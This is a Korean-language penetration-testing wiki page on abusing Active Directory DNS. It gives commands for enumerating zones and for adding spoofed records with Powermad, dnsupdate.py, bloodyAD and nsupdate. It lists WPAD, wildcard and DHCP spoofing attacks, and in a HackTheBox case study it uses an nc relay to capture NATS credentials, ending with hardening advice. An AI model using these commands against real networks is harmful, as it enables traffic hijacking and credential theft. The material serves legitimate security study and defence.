# AD DNS 레코드

{{#include ../../banners/hacktricks-training.md}}

기본적으로 Active Directory의 **모든 사용자**는 Domain 또는 Forest DNS zone의 **모든 DNS 레코드를 열거**할 수 있습니다. 이는 zone transfer와 유사합니다(사용자는 AD 환경에서 DNS zone의 하위 개체를 나열할 수 있습니다).

도구 [**adidnsdump**](https://github.com/dirkjanm/adidnsdump)는 내부 네트워크 정찰을 위해 zone의 **모든 DNS 레코드를 열거**하고 **내보낼** 수 있습니다.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (2025년 4월)에는 JSON/Greppable(`--json`) 출력, 멀티스레드 DNS 확인, LDAPS 바인딩 시 TLS 1.2/1.3 지원이 추가되었습니다.

자세한 내용은 [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>를 참조하세요.

---

## 레코드 생성 / 수정 (ADIDNS spoofing)

기본적으로 **Authenticated Users** 그룹에는 영역 DACL에서 **Create Child** 권한이 있으므로, 도메인 계정(또는 컴퓨터 계정)이라면 누구나 추가 레코드를 등록할 수 있습니다. 이를 트래픽 하이재킹, NTLM relay 강제 유도, 심지어 도메인 전체 침해에 활용할 수 있습니다.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py는 Impacket ≥0.12.0에 포함되어 있습니다)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## 일반적인 공격 프리미티브

1. **Wildcard record** – `*.<zone>`은 AD DNS 서버를 LLMNR/NBNS 스푸핑과 유사한 엔터프라이즈 전체 응답기로 만듭니다. 이를 악용해 NTLM 해시를 캡처하거나 LDAP/SMB로 relay할 수 있습니다. (WINS-lookup이 비활성화되어 있어야 합니다.)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – `wpad`를 추가하거나(**NS** 레코드가 공격자 호스트를 가리키도록 설정해 Global-Query-Block-List를 우회) 아웃바운드 HTTP 요청을 투명하게 프록시하여 자격 증명을 수집합니다. Microsoft는 wildcard/DNAME 우회 방법을 패치했지만(CVE-2018-8320), **NS-record는 여전히 작동합니다**.<sup>[[1]](#references)</sup>    
3. **Stale entry takeover** – 이전에 워크스테이션에 할당됐던 IP 주소를 차지하면 연결된 DNS 항목이 계속 해당 주소를 확인하므로, DNS를 전혀 건드리지 않고도 리소스 기반 제한 위임 또는 Shadow-Credentials 공격을 수행할 수 있습니다.    
4. **DHCP → DNS 스푸핑** – 기본 Windows DHCP+DNS 배포 환경에서는 동일한 서브넷의 인증되지 않은 공격자가 동적 DNS 업데이트를 유발하는 위조 DHCP 요청을 보내 기존 A 레코드(도메인 컨트롤러 포함)를 덮어쓸 수 있습니다(Akamai “DDSpoof”, 2023). 이를 통해 Kerberos/LDAP 트래픽에 대해 machine-in-the-middle 공격을 수행할 수 있으며, 도메인 전체 장악으로 이어질 수 있습니다.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – 제어 중인 머신 계정의 `dNSHostName`을 변경하고, 일치하는 A 레코드를 등록한 뒤 해당 이름으로 인증서를 요청해 DC를 사칭합니다. **Certipy** 또는 **BloodyAD** 같은 도구로 전체 과정을 자동화할 수 있습니다.  

[serialized target information](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073)이 포함된 AD DNS 레코드는 조건부 relay 체인의 일부가 될 수 있습니다. 호출자에게는 레코드 생성 권한, 대상 컴퓨터가 해당 이름으로 인증하도록 유도하는 coercion 경로, 그리고 결과 인증을 수락하는 relay 대상이 필요합니다. 대상 프로토콜은 별도로 평가해야 합니다. 수신 연결의 SMB signing만으로는 HTTPS WinRM 대상이 relay를 수락하는지 판단할 수 없습니다. 패치 수준, 이름 처리, Extended Protection 및 서비스 구성이 결과에 영향을 줄 수 있습니다.

---

### 오래된 동적 레코드를 통한 내부 서비스 하이재킹 (NATS 사례 연구)

동적 업데이트가 모든 인증된 사용자에게 허용되어 있으면 **등록 해제된 서비스 이름을 다시 확보해 공격자 인프라를 가리키도록 설정할 수 있습니다**. Mirage HTB DC에서는 DNS scavenging 이후 호스트 이름 `nats-svc.mirage.htb`가 노출되어, 권한이 낮은 사용자라면 누구나 다음을 수행할 수 있었습니다.<sup>[[3]](#references)</sup>

1. `dig`로 **레코드가 없는지 확인**하고 SOA를 알아냅니다:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **레코드를 다시 생성하여** 자신이 제어하는 외부/VPN 인터페이스를 가리키게 합니다:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **평문 서비스를 사칭**합니다. NATS 클라이언트는 자격 증명을 보내기 전에 `INFO { ... }` 배너를 하나 받을 것으로 예상하므로, 실제 broker의 정상적인 배너를 복사하는 것만으로도 비밀 정보를 수집할 수 있습니다:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

탈취된 이름을 확인하는 모든 클라이언트는 JSON `CONNECT` 프레임(`"user"`/`"pass"` 포함)을 즉시 리스너로 leak합니다. 공격자 호스트에서 공식 `nats-server -V` 바이너리를 실행하거나, 로그 redaction을 비활성화하거나, Wireshark로 세션을 스니핑하기만 해도 TLS가 선택 사항이었기 때문에 동일한 평문 자격 증명을 얻을 수 있습니다.

4. **캡처한 자격 증명으로 pivot** – Mirage에서는 탈취한 NATS 계정으로 JetStream에 접근할 수 있었고, 이를 통해 재사용 가능한 AD 사용자 이름/암호가 포함된 과거 인증 이벤트를 확인할 수 있었습니다.

이 패턴은 보안되지 않은 TCP 핸드셰이크에 의존하는 모든 AD 통합 서비스(HTTP API, RPC, MQTT 등)에 적용됩니다. DNS 레코드가 탈취되면 공격자가 해당 서비스가 됩니다.
브로커 측 열거 및 보존된 메시지 워크플로는 [NATS / JetStream pentesting](../../network-services-pentesting/4222-pentesting-nats.md)을 참조하세요.

---

## 탐지 및 보안 강화

* 민감한 영역에서 **Authenticated Users**의 *Create all child objects* 권한을 제거하고, DHCP에서 사용하는 전용 계정에 동적 업데이트를 위임합니다.
* 동적 업데이트가 필요하면 영역을 **Secure-only**로 설정하고 DHCP에서 **Name Protection**을 활성화하여 소유자 컴퓨터 개체만 자신의 레코드를 덮어쓸 수 있게 합니다.
* DNS Server 이벤트 ID 257/252(동적 업데이트), 770(영역 전송) 및 `CN=MicrosoftDNS,DC=DomainDnsZones`에 대한 LDAP 쓰기를 모니터링합니다.
* 의도적으로 무해한 레코드 또는 Global Query Block List를 사용해 위험한 이름(`wpad`, `isatap`, `*`)을 차단합니다.
* DNS 서버에 최신 패치를 적용합니다. 예를 들어, RCE 취약점 CVE-2024-26224 및 CVE-2024-26231은 **CVSS 9.8**에 도달했으며 Domain Controller를 대상으로 원격 악용이 가능합니다.  



## References

- [1] [ADIDNS 재방문 - WPAD, GQBL 및 그 외](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [DHCP DNS 동적 업데이트 악용을 통한 DNS 레코드 스푸핑](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: NFS Leak, Dynamic DNS 악용, NATS 자격 증명 탈취, JetStream 비밀 정보 및 Kerberoasting 연쇄 공격](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [영역에 진입하기: adidnsdump를 사용해 Active Directory DNS 덤프하기](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
